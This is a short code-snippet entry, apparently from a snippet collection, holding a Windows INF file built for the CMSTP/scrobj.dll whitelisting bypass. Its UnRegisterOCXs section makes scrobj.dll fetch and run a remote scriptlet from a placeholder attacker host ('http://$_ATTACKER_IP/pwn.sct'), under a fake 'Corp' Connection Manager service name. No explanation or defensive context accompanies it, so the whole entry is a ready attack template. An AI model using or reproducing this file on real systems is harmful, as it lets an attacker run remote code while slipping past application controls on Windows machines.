---
id: 69af1a66-bfaf-460a-b8bb-a0cbf9aca0f1
type: code
language: INF File
verified: false
created_at: '2020-03-17T03:20:36.971240+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet 69af1a66

**Language**: INF File

```inf file
[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall_SingleUser]
UnRegisterOCXs=UnRegisterOCXSection

[UnRegisterOCXSection]
%11%\scrobj.dll,NI,http://$_ATTACKER_IP/pwn.sct

[Strings]
AppAct="SOFTWARE\Microsoft\Connection Manager"
ServiceName="Corp"
ShortSvcName="Corp"
```
